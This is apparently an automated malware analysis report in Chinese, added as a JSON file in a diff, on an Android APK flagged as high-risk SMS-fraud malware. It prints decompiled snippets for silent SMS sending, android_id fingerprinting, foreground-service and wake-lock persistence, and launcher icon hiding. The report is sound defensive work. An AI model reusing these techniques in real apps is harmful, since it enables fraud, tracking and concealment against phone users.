@@ -1,0 +1,148 @@
+{
+  "APK信息": {
+    "文件名": "105cf10de9f7cebd4136c6cee92388d59be18bf8eb7c2377ff4b7302883a1970.apk",
+    "sha256": "105cf10de9f7cebd4136c6cee92388d59be18bf8eb7c2377ff4b7302883a1970",
+    "包名": "com.effort.charm",
+    "应用名": "Сooбщeниe",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 106.1
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\effort\\charm\\a;",
+          "method_signature": "a(String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SowContain.a(true);\nSmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
+          "malicious_code_snippet_context": "  \n      public static void a(String str, String str2, PendingIntent pendingIntent) {\n          try {\n>>>             SowContain.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n          }\n      }",
+          "behavior_description": "该方法通过 SmsManager.getDefault().sendTextMessage() 静默发送短信，无需用户交互或确认。参数 str（目标号码）、str2（短信内容）和 pendingIntent 均由外部传入，恶意程序可利用此方法向指定号码发送欺诈短信、订阅扣费服务或外泄隐私数据。调用前执行 SowContain.a(true) 可能用于标记发送状态或触发其他恶意逻辑。异常被静默吞掉，进一步隐蔽其行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\effort\\charm\\a;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String c(Context context) {\n    return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n}",
+          "malicious_code_snippet_context": "          return false;\n      }\n  \n>>>     public static String c(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>     }\n  \n      private static void c(Context context, long j) {\n          if (j - a > 10014) {",
+          "behavior_description": "该方法通过 Settings.Secure.getString 获取设备的 android_id 标识符，用于设备指纹采集。android_id 作为设备唯一标识符，在恶意样本中通常被收集后上报至C2服务器用于用户追踪或设备识别。数据流向：Settings.Secure.getString(ContentResolver, \"android_id\") → 方法返回值（供调用方进一步使用或上报）",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\effort\\charm\\Deprivation;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    startForegroundService(b());\n} else {\n    startService(b());\n}\nthis.b = ((PowerManager) getSystemService(\"power\")).newWakeLock(1, \"Sleep\");\nthis.b.setReferenceCounted(false);\nthis.b.acquire();",
+          "malicious_code_snippet_context": "                  new c(Deprivation.this.getApplicationContext(), 77).a(\"t\", Log.getStackTraceString(th)).a();\n              }\n          });\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             startForegroundService(b());\n>>>         } else {\n>>>             startService(b());\n>>>         }\n>>>         registerReceiver(new Password(), new IntentFilter(\"status\"));\n>>>         this.b = ((PowerManager) getSystemService(\"power\")).newWakeLock(1, \"Sleep\");\n>>>         this.b.setReferenceCounted(false);\n          this.b.acquire();\n          a.a(getApplicationContext(), System.currentTimeMillis());\n          HandlerThread handlerThread = new HandlerThread(\"Fashionable\");",
+          "behavior_description": "应用启动时通过startForegroundService或startService启动后台服务，并获取PowerManager的PARTIAL_WAKE_LOCK锁使设备CPU保持唤醒，结合前台服务实现恶意程序的持久化保活，防止被系统杀死或休眠。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\effort\\charm\\RealityDish;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) RealityDish.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class RealityDish extends Activity {\n      private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) RealityDish.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "代码在Activity创建时调用setComponentEnabledSetting方法，将自身组件状态设置为禁用（参数2对应COMPONENT_ENABLED_STATE_DISABLED），导致应用图标在桌面隐藏，从而避免用户发现和卸载。数据来源为getApplicationContext()，危险操作为setComponentEnabledSetting()。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
